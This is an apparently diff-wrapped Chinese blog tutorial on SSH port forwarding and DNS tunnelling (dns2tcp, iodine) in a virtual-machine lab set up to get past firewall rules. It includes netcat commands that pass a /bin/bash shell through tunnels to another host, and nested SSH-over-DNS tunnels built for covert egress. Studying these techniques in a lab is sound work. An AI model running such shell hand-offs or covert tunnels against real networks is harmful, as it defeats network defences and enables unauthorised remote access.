+<li>远程侦听端口，访问转发到本机主机指定端口</li>
+<li>由于 ACL 等原因，SSH 与应用连接建立方向相反</li>
+<li>SSH 客户端、应用客户端位于 FW 两端</li>
+<li>SSH 服务器、应用服务器位于 FW 两端</li>
+<li><strong>ssh -fCNg -R :: user@ -p</strong></li>
+<li>之所以成为远程，是因为 SSH 侦听端口开在远程【外网】的 SSH Server
+上</li>
+<li>侦听端口永远在客户端一方</li>
+<li>听起来有点绕，可以结合后面的实操理解</li>
+</ul>
+<h3 id="动态隧道模式"><strong>3、动态隧道模式</strong></h3>
+<ul>
+<li><strong>本地、远程端口转发都需要固定应用服务器IP、Port</strong></li>
+<li>应用端口繁多，逐个转发效率低</li>
+<li>某些应用不固定端口</li>
+<li>某些网站不支持IP直接访问</li>
+<li>使用非受信网络上网时保护流量不被嗅探</li>
+<li>本地侦听 socks4/5 代理端口</li>
+<li>由 SSH server 决定如何转发</li>
+<li>作为翻墙代理使用</li>
+<li>配置客户端代理（浏览器）</li>
+<li>使用 proxychains 支持无代理客户端</li>
+<li><strong>ssh -CfNg -D 7001 root@1.1.1.1 -p 2121</strong></li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9a4b2672f.png" /><img data-src="https://img2023.cnblogs.com/blog/2379545/202303/2379545-20230316221545683-1547919404.png" /></p>
+<h3 id="x协议转发">4、X协议转发</h3>
+<ul>
+<li><strong>远程登陆 Linux GUI 运行图形化界面工具</strong></li>
+<li>VNC</li>
+<li>X windows</li>
+<li><strong>防火墙限制访问时</strong></li>
+<li>基于 SSH 的 X 转发</li>
+<li>ssh -X user@1.1.1.1 -p 53</li>
+<li><strong>也就是说基于X协议的转发可以用图形化界面操作目标机【理解见实操】</strong></li>
+</ul>
+<h2 id="四ssh-本地端口转发实操">四、SSH 本地端口转发实操</h2>
+<h3 id="环境部署-1">1、环境部署</h3>
+<h4 id="基本概述">（1）基本概述</h4>
+<ul>
+<li>防火墙还是前面搭建的monowall，仅允许访问外网53端口。内网机由kali-2.0，xp充当，外网机由Kali-2022，win2008充当。</li>
+<li>通过kali-2.0与Kali-2022建立ssh隧道，监听端口设在Ubuntu【本地转发】，通过访问Ubuntu的监听端口访问kali及win2008的web服务，远程桌面等</li>
+<li>monowall【仅主机模式+NAT模式】:10.1.1.1</li>
+<li>kali-2.0【仅主机模式】:10.1.1.2</li>
+<li>xp【仅主机模式】:10.1.1.4</li>
+<li>kali-2022【NAT模式】:192.168.159.129</li>
+<li>win2008【NAT模式】:192.168.159.134</li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9a559bb9c.png" /><img data-src="https://img2023.cnblogs.com/blog/2379545/202303/2379545-20230316205605757-1027798732.png" /></p>
+<h4 id="kali-2022-配置">（2）kali-2022 配置</h4>
+<p>vim /etc/ssh/sshd_config #编辑该文件，作以下修改 PermitRootLogin yes
+#默认情况下是禁止以root登录的 Port 53 #monowall仅允许访问53端口
+PasswordAuthentication yes #开启登录认证 systemctl restart ssh.service
+#重启ssh</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9a90884ae.png" /><img data-src="https://img2023.cnblogs.com/blog/2379545/202303/2379545-20230316195854144-888079336.png" /></p>
+<ul>
+<li><strong>用kali-2.0测试下</strong></li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9a9848927.png" /><img data-src="https://img2023.cnblogs.com/blog/2379545/202303/2379545-20230316200048773-50501378.png" /></p>
+<h3 id="访问-win2008">2、访问 win2008</h3>
+<ul>
+<li><strong>命令：</strong></li>
+</ul>
+<p>ssh -fCNg -L <listen port>:<remote ip>:<remote port>
+user@<ssh server> -p <ssh server port></p>
+<ul>
+<li>-f：后台运行进程</li>
+<li>-N：不执行登录
+shell（不显示登录的界面，即远程kali-2022的shell）</li>
+<li>-C：进行压缩，节省带宽</li>
+<li>-g：复用访问时作为网关，支持多主机访问本地侦听端口</li>
+<li>listen port：kali-2.0上的监听端口</li>
+<li>remote ip/port：最终要访问的地址【此处即为win2008ip/port】</li>
+<li><strong>示例【kali-2.0 命令】</strong></li>
+</ul>
+<p>ssh -fCNg -L 4001:192.168.159.134:80 root@192.168.159.129 -p 53</p>
+<ul>
+<li><strong>效果：</strong></li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9abb38fc8.png" /><img data-src="https://img2023.cnblogs.com/blog/2379545/202303/2379545-20230316204143377-1810698387.png" /></p>
+<ul>
+<li><strong>注</strong>，加-g参数后，该隧道支持内网区中的其他PC（如xp）等也可通过访问10.1.1.2:4001【kali-2.0】而访问外网win2008。</li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9ac3cd0c7.png" /><img data-src="https://img2023.cnblogs.com/blog/2379545/202303/2379545-20230316213157245-1345762985.png" /></p>
+<h3 id="访问kali-2022的web特殊">3、访问kali-2022的web【特殊】</h3>
+<ul>
+<li><strong>命令：</strong></li>
+</ul>
+<p>ssh -fCNg -L <listen port>:localhost:<remote port> user@<ssh server>
+-p <ssh port> ssh -fCNg -L 4002:localhost:80 root@192.168.159.129 -p
+53</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9acfc198b.png" /></p>
+<ul>
+<li><strong>效果：</strong></li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9ae9795fb.png" /><strong><img data-src="https://img2023.cnblogs.com/blog/2379545/202303/2379545-20230316215927680-2038834480.png" /></strong></p>
+<h3 id="nc-获取shell"><strong>4、nc 获取shell</strong></h3>
+<ul>
+<li><strong>win2008开启监听</strong></li>
+</ul>
+<p>nc -nvlp 4444</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9af335d77.png" /><img data-src="https://img2023.cnblogs.com/blog/2379545/202303/2379545-20230316213110811-677764557.png" /></p>
+<ul>
+<li><strong>kali-2.0命令：</strong></li>
+</ul>
+<p>ssh -fCNg -L 4003:192.168.159.134:4444 root@192.168.159.129 -p 53 nc
+127.0.0.1 4003 -c /bin/bash</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9b1ef02a9.png" /></p>
+<ul>
+<li><strong>win2008效果：</strong></li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9b25c6df9.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9b2a8936e.png" /></p>
+<h3 id="远程桌面">5、远程桌面</h3>
+<ul>
+<li><strong>命令：</strong></li>
+</ul>
+<p>ssh -fCNg -L 4002:192.168.159.134:3389 root@192.168.159.129 -p 53
+rdesktop 127.0.0.1:4002</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9b4dea693.png" /></p>
+<ul>
+<li><strong>效果：</strong></li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9b5685146.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9b5685146.png" /></p>
+<h2 id="五ssh-远程端口转发">五、SSH 远程端口转发</h2>
+<p><strong>注，与前面不同点在于侦听端口在 kali-2022
+上，也就是说，外网可以突破monowall访问内网机。此处以外网机 kali-2022
+访问内网机 xp 的服务【IIS，远程桌面，nc为例】。</strong></p>
+<ul>
+<li>monowall【仅主机模式+NAT模式】:10.1.1.1</li>
+<li>kali-2.0【仅主机模式】:10.1.1.3</li>
+<li>xp【仅主机模式】:10.1.1.2</li>
+<li>kali-2022【NAT模式】:192.168.159.129</li>
+</ul>
+<h3 id="xp安装iis">1、xp安装iis</h3>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9b6cce5ca.png" /><img data-src="https://img2023.cnblogs.com/blog/2379545/202303/2379545-20230316223112501-1763091234.png" /></p>
+<p>　　如果安装时出现需要Windows XP Professional Service Pack 2 CD
+上的文件’staxmem.dll，建议网上直接下载个iis安装包：<a
+target="_blank" rel="noopener" href="https://s2.runjiapp.com/iis5.1_xz7.com.zip">https://s2.runjiapp.com/iis5.1_xz7.com.zip</a></p>
+<h3 id="访问-xp-的iis">2、访问 xp 的iis</h3>
+<ul>
+<li><strong>kali-2.0 命令</strong></li>
+</ul>
+<p>ssh -fCNg -R 4001:10.1.1.2:80 root@192.168.159.129 -p 53</p>
+<ul>
+<li><strong>kali-2022 端口状态</strong></li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9b7860c84.png" /></p>
+<ul>
+<li><strong>效果：</strong></li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9b8c9fc4c.png" /></p>
+<h3 id="访问-xp-远程桌面">3、访问 xp 远程桌面</h3>
+<ul>
+<li><strong>kali-2.0 命令</strong></li>
+</ul>
+<p>ssh -fCNg -R 4002:10.1.1.2:3389 root@192.168.159.129 -p 53</p>
+<ul>
+<li><strong>kali-2022 效果：</strong></li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9b9cbf2c6.png" /></p>
+<h3 id="获取-nc-的-shell">4、获取 nc 的 shell</h3>
+<ul>
+<li><strong>kali-2.0 命令</strong></li>
+</ul>
+<p>ssh -fCNg -R 4003:10.1.1.2:4444 root@192.168.159.129 -p 53</p>
+<ul>
+<li><strong>xp先开启监听</strong></li>
+</ul>
+<p>nc -nvlp 4444</p>
+<ul>
+<li><strong>kali-2022连接</strong></li>
+</ul>
+<p>nc 127.0.0.1 4003 -c /bin/bash</p>
+<ul>
+<li><strong>效果【xp】：</strong></li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9bb85efde.png" /></p>
+<h2 id="六ssh动态端口转发">六、SSH动态端口转发</h2>
+<ul>
+<li><strong>注，环境接前</strong></li>
+<li><strong>kali-2.0命令</strong></li>
+</ul>
+<p>ssh -fCNg -D 4444 root@192.168.159.129 -p 53</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9bd93cc66.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9be044899.png" /><img data-src="https://img2023.cnblogs.com/blog/2379545/202303/2379545-20230317120806627-1328247263.png" /></p>
+<ul>
+<li><strong>xp效果：</strong></li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9be044899.png" /></p>
+<h2 id="七x协议转发">七、X协议转发</h2>
+<ul>
+<li><strong>远程登陆 Linux GUI 运行图形化界面工具【特点】</strong></li>
+<li>VNC</li>
+<li>X windows</li>
+<li><strong>防火墙限制访问时</strong></li>
+<li>基于 SSH 的 X 转发，所有的操作都是记录在 kali-2022
+中，本地kali-2.0只是查看和操作</li>
+<li>ssh -X <a href="mailto:user@1.1.1.1">user@1.1.1.1</a> -p 53</li>
+<li><strong>kali-2.0 命令【环境接上】:</strong></li>
+</ul>
+<p>ssh -X root@192.168.159.129 -p 53</p>
+<ul>
+<li><strong>效果：</strong></li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9c0492fdb.png" /><img data-src="https://img2023.cnblogs.com/blog/2379545/202303/2379545-20230317123130201-1418783803.png" /></p>
+<h2 id="八dns-协议隧道">八、DNS 协议隧道</h2>
+<ul>
+<li><strong>防火墙禁止 TCP 出站访问流量</strong></li>
+<li><strong>SSH 隧道、端口转发全部失效</strong></li>
+<li><strong>重定向和 SSH 隧道只能适用于 TCP 53 端口，对 UDP 53
+端口无法使用。</strong></li>
+<li><strong>使用基于UDP协议的隧道</strong></li>
+<li><strong>DNS 的工作原理适合用于实现隧道</strong></li>
+<li><strong>DNS TCP 53 端口主要用于 DNS
+服务器之间进行数据同步（区域传输），而用户提交的 DNS 查询请求，都是 UDP
+53 端口的流量</strong></li>
+<li><strong>DNS 工作原理，递归+迭代自行百度此处略</strong></li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9c1394f2e.png" /><strong><img data-src="https://img2023.cnblogs.com/blog/2379545/202304/2379545-20230401204417391-1891391657.png" /></strong></p>
+<h3 id="dns-隧道原理">1、DNS 隧道原理</h3>
+<p><strong>申请注册受自己控制的 DNS 服务器（如 .test.lab.com
+域权威dns服务器），也就是说对于 *.test.lab.com 的权威解析由 test.lab.com
+服务器来完成。为此我们可以在局域网（上图为例）中的主机在进行
+test.lab.com 的子域解析请求时包含建立隧道的数据，在请求到达我们控制的
+test.lab.com 服务器后，服务器根据请求做出响应，并将结果包含于 dns
+解析的回包中返回给请求者，即建立dns隧道。这对于防火墙，缓存 dns
+服务器等看来传输的流量也是正常合法的。另外由于缓存DNS服务器，其他权威服务器的存在对于我们控制的dns服务器而言也比较安全。</strong></p>
+<h3 id="dns2tcp-工具介绍">2、dns2tcp 工具介绍</h3>
+<ul>
+<li><p><strong>dns2tcp</strong></p></li>
+<li><p><strong>利用合法 DNS 服务器（缓存dns服务器）实现 DNS
+隧道</strong></p></li>
+<li><p><strong>C/S
+（dns2tcpc/dns2tcpd）结构，dns2tcpc负责插入建立隧道的数据，dns2tcpd负责响应。</strong></p></li>
+<li><p><strong>通过 TXT
+记录加密传输数据（A记录长度有限），形式：建立隧道的请求数据.test.lab.com</strong></p></li>
+<li><p><strong>隧道建立后保持连接，周期性请求-响应以确保服务器存活</strong></p></li>
+<li><p><strong>默认记录生存时间 TTL 值为 3 秒</strong></p></li>
+<li><p><strong>安装</strong></p></li>
+<li><p>kali有自带，没得话用apt-get install dns2tcp 手动安装下。</p></li>
+<li><p>服务器配置文件</p></li>
+<li><p>/etc/dns2tcpd.conf</p></li>
+<li><p>.dns2tcprcd</p></li>
+<li><p>资源可以是其他地址</p></li>
+<li><p>启动</p></li>
+<li><p>dns2tcpd -F -d 1 -f /etc/dns2tcpd.conf</p></li>
+<li><p>F:前端运行</p></li>
+<li><p>d：debug level 1-3</p></li>
+<li><p>f:指定配置文件</p></li>
+</ul>
+<h3 id="实验环境适用场景一">3、实验环境【适用场景一】</h3>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9c222f13a.png" /><img data-src="https://img2023.cnblogs.com/blog/2379545/202304/2379545-20230401213522728-130582881.png" /></p>
+<ul>
+<li><strong>内网机</strong></li>
+<li>kali-2.0：10.1.1.3</li>
+<li>确保已安装dns2tcp、wireshark、firefox</li>
+<li><strong>配置DNS服务器</strong></li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9c2ace10f.png" /><img data-src="https://img2023.cnblogs.com/blog/2379545/202304/2379545-20230401223531184-107165947.png" /></p>
+<ul>
+<li><strong>测试【先把后面的环境配置完再测试这个】</strong></li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9c365b7fd.png" /><img data-src="https://img2023.cnblogs.com/blog/2379545/202304/2379545-20230401232639310-1860430892.png" /></p>
+<ul>
+<li><strong>防火墙</strong></li>
+<li>monowall：10.1.1.1</li>
+<li>防火墙：只允许出站UDP 53端口流量</li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9c501de45.png" /></p>
+<ul>
+<li><strong>缓存DNS服务器</strong></li>
+<li>Win 2008：192.168.159.134</li>
+<li>安装DNS服务；配置转发器，创建区域 lab.com，指派二级域
+test.lab.com，NS记录指向Kali-2022</li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9c57b7f14.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9c5fcd6f7.png" /><img data-src="https://img2023.cnblogs.com/blog/2379545/202304/2379545-20230401215413318-410947725.png" /></p>
+<p>　　<strong>注</strong>，因要做dns服务器所以IP得改成静态的，另外首选DNS服务器也改成自己的地址。</p>
+<ul>
+<li><strong>创建区域 lab.com</strong></li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9c669d486.png" /></p>
+<ul>
+<li><strong>新建主机记录</strong></li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9c6de1152.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9c782f4a8.png" /><img data-src="https://img2023.cnblogs.com/blog/2379545/202304/2379545-20230401220855999-92819346.png" /></p>
+<ul>
+<li><strong>新建委派</strong>【委派必须指向主机记录，不能直接指向kali-2022的IP地址】</li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9c8535df7.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9c8deec20.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9ca23f926.png" /><img data-src="https://img2023.cnblogs.com/blog/2379545/202304/2379545-20230401222903149-861116897.png" /></p>
+<ul>
+<li><strong>配置转发器</strong>【凡是解析不了的域名都使用转发器转发到类似于8.8.8.8的官方
+dns 服务器】</li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9cab0330e.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9cb1cf901.png" /><img data-src="https://img2023.cnblogs.com/blog/2379545/202304/2379545-20230401223219112-1484911073.png" /></p>
+<ul>
+<li><strong>受控 DNS 服务器</strong></li>
+<li>kali-2022：192.168.159.129</li>
+<li>服务端的配置：即可直接修改 /etc/dns2tcpd.conf 文件，dns2tcpd
+启动时用 -f 参数指定，也可再当前主目录新建个 .dns2tcprcd
+文件【内容同前】让他启动时自己去查询加载。</li>
+<li><strong>修改 /etc/dns2tcpd.conf 为例</strong></li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9cba0905e.png" /></p>
+<ul>
+<li><strong>服务端启动</strong></li>
+</ul>
+<p>dns2tcpd -F -d 1 -f /etc/dns2tcpd.conf</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9cc998207.png" /><img data-src="https://img2023.cnblogs.com/blog/2379545/202304/2379545-20230402112611170-98929434.png" /></p>
+<h3 id="建立隧道">4、建立隧道</h3>
+<ul>
+<li><strong>ssh 隧道</strong></li>
+</ul>
+<p>dns2tcpc -c -k 123.com -d 1 -l 4444 -r ssh -z test.lab.com</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9cdd291a3.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9cdd291a3.png" /></p>
+<p><strong>注，ssh
+服务端【kali-2022】的配置修改同前，如果建立连接时遇到 ssh_exchange_identification:read
+connection reset by peer 问题，可在 /etc/hosts.allow 文件中添加个sshd:
+ALL【kali-2022端】，再重启 ssh 解决。</strong></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9cf504bb7.png" /></p>
+<ul>
+<li><strong>http 服务</strong></li>
+</ul>
+<p>dns2tcpc -c -k 123.com -d 1 -l 3333 -r http -z test.lab.com</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9d089b37f.png" /></p>
+<p><strong>其它服务操作同理……至于建立过程中的细节建议抓包了解</strong></p>
+<h2 id="九隧道嵌套">九、隧道嵌套</h2>
+<p><strong>基于 SSH 资源将 SSH 动态端口转发隧道嵌套于 DNS
+隧道中【动态端口转发可以做成网关进行代理转发局域网内的主机连接流量 】</strong></p>
+<p>实验环境接上</p>
+<ul>
+<li><strong>kali-2.0 操作</strong></li>
+</ul>
+<p>#建立DNS隧道 dns2tcpc -c -k 123.com -d 1 -l 8080 -r ssh -z
+test.lab.com #建立嵌套于DNS隧道的SSH隧道 ssh -CfNg root@127.0.0.1 -p
+8080 -D 7001</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9d3d05d57.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9d4390772.png" /><img data-src="https://img2023.cnblogs.com/blog/2379545/202304/2379545-20230402130520680-1010086152.png" /></p>
+<ul>
+<li><strong>效果</strong></li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9d4c8c748.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9d52aeb90.png" /><img data-src="https://img2023.cnblogs.com/blog/2379545/202304/2379545-20230402130538772-337041687.gif" /></p>
+<h2 id="十dns2tcp-适用场景二">十、dns2tcp 适用场景二</h2>
+<ul>
+<li>FW 限制只允许内网 DNS 服务器访问外网指定 DNS 服务器 UDP 53 端口</li>
+<li>内网 DNS 服务器：安装 DNS 服务，配置转发器到外网 DNS 服务器</li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9d5e36e15.png" /><img data-src="https://img2023.cnblogs.com/blog/2379545/202304/2379545-20230402150454247-152541263.png" /></p>
+<ul>
+<li>实验环境基本同上，只不过内网中多个 DNS 服务器【win2003充当】</li>
+</ul>
+<h3 id="内网-dns-服务器配置">1、内网 DNS 服务器配置</h3>
+<ul>
+<li><strong>IP 配置</strong></li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9d67493c4.png" /><img data-src="https://img2023.cnblogs.com/blog/2379545/202304/2379545-20230402151057851-203427402.png" /></p>
+<ul>
+<li><strong>转发器配置【自己解析不了的去访问外网特定DNS服务器】</strong></li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9d6dea15f.png" /><img data-src="https://img2023.cnblogs.com/blog/2379545/202304/2379545-20230402153105352-85166353.png" /></p>
+<ul>
+<li><strong>测试【后面配置完在测试】</strong></li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9d746b3c3.png" /><img data-src="https://img2023.cnblogs.com/blog/2379545/202304/2379545-20230402153145903-139766937.png" /></p>
+<h3 id="monowall-配置">2、monowall 配置</h3>
+<ul>
+<li>仅允许内网DNS服务器访问外网特定DNS服务器</li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9d7ae0628.png" /><img data-src="https://img2023.cnblogs.com/blog/2379545/202304/2379545-20230402151507888-1595139242.png" /></p>
+<h3 id="kali-2022-配置-1">3、kali-2022 配置</h3>
+<ul>
+<li><strong>squid 安装</strong></li>
+</ul>
+<p>apt install squid</p>
+<ul>
+<li><strong>squid 启动</strong></li>
+</ul>
+<p>/etc/init.d/squid restart</p>
+<ul>
+<li><strong>dns2tcpd 配置及启动</strong></li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9d8af1d7e.png" /></p>
+<p>dns2tcpd -F -d 1 -f /etc/dns2tcpd.conf</p>
+<h3 id="外网-dns-服务器配置">4、外网 DNS 服务器配置</h3>
+<ul>
+<li>服务器直接用前面实验的已配置的缓存DNS服务器</li>
+</ul>
+<h3 id="内网-kali-2.0-配置">5、内网 kali-2.0 配置</h3>
+<ul>
+<li>配置 dns 指向内网中的DNS服务器【win2003-10.1.1.2】</li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9d9859f40.png" /><img data-src="https://img2023.cnblogs.com/blog/2379545/202304/2379545-20230402155103372-109174572.png" /></p>
+<ul>
+<li><strong>测试</strong></li>
+</ul>
+<p>dig -t ns test.lab.com</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9daa2b306.png" /><img data-src="https://img2023.cnblogs.com/blog/2379545/202304/2379545-20230402155314170-1218552423.png" /></p>
+<h3 id="建立隧道-1">6、建立隧道</h3>
+<p>dns2tcpc -c -k 123.com -d 1 -l 8080 -r http -z test.lab.com</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9db124086.png" /></p>
+<h3 id="测试">7、测试</h3>
+<ul>
+<li><strong>浏览器配置代理测试</strong></li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/04/img_642a9dc4660cd.png" /><img data-src="https://img2023.cnblogs.com/blog/2379545/202304/2379545-20230402161446453-615198095.png" /></p>
+<h2 id="十一dns-协议隧道工具-iodine-介绍">十一、DNS 协议隧道工具 iodine
+介绍</h2>
+<ul>
+<li><p><strong>基于 DNS 查询的隧道工具</strong></p></li>
+<li><p><strong>与同类工具相比的优点</strong></p></li>
+<li><p><strong>对下行数据不进行编码，因此性能优</strong></p></li>
+<li><p><strong>支持多平台：Linux、BSD、Mac OS、Windows</strong></p></li>
+<li><p><strong>最大16个并发链接</strong></p></li>
+<li><p><strong>支持同网段隧道
+IP（不同于服务器、客户端网段），即在隧道两端提供虚拟网卡及虚拟
+IP</strong></p></li>
+<li><p><strong>支持多种 DNS 记录类型【自行协商】</strong></p></li>
+<li><p><strong>丰富的隧道质量检测措施</strong></p></li>
+<li><p><strong>运行服务器端</strong></p></li>
+<li><p><strong>iodined -f -c 10.0.0.1 test.lab.com</strong></p></li>
+<li><p>-f：前段显示（可选）</p></li>
+<li><p>-c：不检查客户端地址</p></li>
+<li><p>IP：服务器端的隧道IP地址（不同于服务器主机IP和客户端主机IP，此IP仅用于隧道之间，在隧道的两端构成独立的网段）</p></li>
+<li><p><strong>运行客户端</strong></p></li>
+<li><p>指定IP：局域网内部的本地 DNS 服务器</p></li>
+<li><p><strong>iodine -f test.lab.com</strong></p></li>
+<li><p>curl --socks5-hostname
+127.0.0.1:7001 http://www.sina.com</p></li>
+<li><p><strong>隧道网络接口</strong></p></li>
+<li><p>不基于资源的通用隧道，如同本网段内两台相邻的主机</p></li>
+<li><p>隧道两端接口的IP地址应不同于客户端和服务器端网段</p></li>
+<li><p><strong>基于此隧道可嵌套其他隧道技术</strong></p></li>
+<li><p>ssh -CfNg -D 7001 root@10.0.0.1</p></li>
+<li><p><strong>安装 TAP 网卡驱动</strong></p></li>
+<li><p>https://openvpn.net/index.php/open-source/downloads.html 或 <a
+target="_blank" rel="noopener" href="https://build.openvpn.net/downloads/releases/">https://build.openvpn.net/downloads/releases/</a></p></li>
+<li><p>只安装 TAP Virtual Ethernet Adapter 和所有依赖包</p></li>
+<li><p><strong>注</strong>，不同系统对版本有要求，如果测试时显示隧道建立成功，但实际
+ping 不通 10.0.0.1，可换个 openvpn 版本装 TAP
+虚拟网卡，个人测试【win7】成功的版本：<a
+target="_blank" rel="noopener" href="https://build.openvpn.net/downloads/releases/openvpn-install-2.3.11-I001-i686.exe">https://build.openvpn.net/downloads/releases/openvpn-install-2.3.11-I001-i686.exe</a></p></li>
+<li><p><strong>Windows 客户端</strong></p></li>
+<li><p>http://code.kryo.se/iodine/</p></li>
+<li><p>iodine -f test.lab.com</p></li>
+<li><p><strong>建立 SSH 隧道</strong></p></li>
+</ul>
